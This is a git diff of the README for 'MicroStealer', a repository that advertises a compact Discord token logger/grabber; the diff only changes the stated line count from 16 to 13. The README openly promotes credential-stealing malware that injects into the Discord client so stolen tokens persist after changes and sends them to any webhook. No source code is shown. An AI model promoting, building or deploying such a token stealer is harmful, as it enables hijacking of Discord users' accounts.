@@ -1,5 +1,5 @@
 # 💾 MicroStealer
-<h2 align="center">⚡ A compact Discord Token Logger/Discord Token Grabber made in only 16 lines of code! Injects into discord for long-term use.</h3>
+<h2 align="center">⚡ A compact Discord Token Logger/Discord Token Grabber made in only 13 lines of code! Injects into discord for long-term use.</h3>
 <h4 align="center">🌟 If you enjoy this, star this repository and drop a follow! Thanks 😊</h3>
 
 The other day, I decided to create a **simple token stealer** using the least amount of lines possible.<br />This is how it came out!<br />
@@ -9,7 +9,7 @@ The other day, I decided to create a **simple token stealer** using the least am
 
 * `Injects, so even if the user changes their token you have it! `
 * `Works with any webhook, even if it's not discord! `
-* `Only 16 lines of code! `
+* `Only 13 lines of code! `
 * `No external modules needed! `
 
 # Usage (If for some reason you want to use it)
